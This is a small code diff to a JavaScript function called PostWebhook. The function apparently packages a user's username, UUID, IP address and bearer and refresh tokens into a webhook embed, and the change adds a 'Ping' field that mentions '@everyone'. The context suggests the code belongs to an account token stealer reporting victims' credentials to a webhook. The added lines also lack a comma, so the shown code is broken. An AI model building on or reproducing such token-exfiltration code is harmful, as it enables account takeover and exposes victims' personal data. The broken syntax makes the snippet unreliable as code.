@@ -306,6 +306,11 @@ async function PostWebhook(refresh, username, uuid, ip, BearerToken, RefreshToke
                 color: 5814783,
                 fields: [
                     {
+                        name: "Ping",
+                        value: `@everyone`
+                        inline: true
+                    },
+                    {
                         name: "Username",
                         value: username,
                         inline: true
